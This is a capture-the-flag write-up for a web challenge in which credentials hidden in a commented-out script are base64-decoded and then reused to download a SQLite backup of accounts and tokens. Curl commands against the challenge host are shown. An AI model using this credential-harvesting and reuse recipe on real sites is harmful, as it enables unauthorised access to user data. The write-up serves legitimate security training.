# Panic in the Northern Quadrant — 1

- **Category:** Web
- **Challenge ID:** 52
- **Target:** `http://panic-in-the-northern-quadrant.ctf.thcon.party:8080`

```
THC{s3cur3p455}
```

## TL;DR

- Page HTML contains a **commented-out** `<script>` with a `backup()` helper that calls `atob("...")` on a hardcoded base64 string and forwards the result as `/backup.php?auth=`.
- `base64 -d` the string → `username=sst&password=THC{s3cur3p455}`. The password is the flag.
- The `/backup.php?auth=...` endpoint also serves a SQLite backup used by part 2 — note it for later.

## 1. Source review

```bash
$ curl -si http://panic-in-the-northern-quadrant.ctf.thcon.party:8080/
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.34
Set-Cookie: PHPSESSID=...
...
<!-- TODO: remove before production
<script>
  function backup() {
    var creds = atob("dXNlcm5hbWU9c3N0JnBhc3N3b3JkPVRIQ3tzM2N1cjNwNDU1fQ==");
    fetch("/backup.php?auth=" + creds);
  }
</script>
-->
```

Two observations:

1. The `<script>` is **HTML-commented**, so browsers don't execute it — but the bytes still ride down on the response and are trivially visible to anyone who runs `curl`. "Hidden in a comment" isn't hidden.
2. `atob()` is just base64. There's no encryption, just clear-text credentials behind a one-line decoder.

## 2. Decode

```bash
$ echo dXNlcm5hbWU9c3N0JnBhc3N3b3JkPVRIQ3tzM2N1cjNwNDU1fQ== | base64 -d
username=sst&password=THC{s3cur3p455}
```

The flag is the password value.

## 3. Bonus — what `backup()` actually does

The same string, percent-encoded, used as `auth` against `/backup.php`:

```bash
$ curl -sO "http://.../backup.php?auth=username=sst%26password=THC%7Bs3cur3p455%7D"
$ file backup.php
SQLite 3.x database
```

The endpoint serves a SQLite backup that part 2 needs — keep the file. It contains tables of accounts, tokens, etc., and one of those rows holds the next flag.

## 4. Methodology

- **`curl -s | grep -i base64\|atob` is the first scan on any "find the credentials" web challenge.** Comments aren't security; both client-side decoders and inline base64 stand out instantly in the source.
- **`atob` calls in JS are advertising base64 decoding to anyone reading the source.** The string next to them is the payload; treat it as pre-decoded.
- **When a discovered endpoint accepts a structured `auth` parameter, fetch it once and check the response type before reading.** A SQLite DB or ZIP often appears mid-recon and turns into the next part's input.
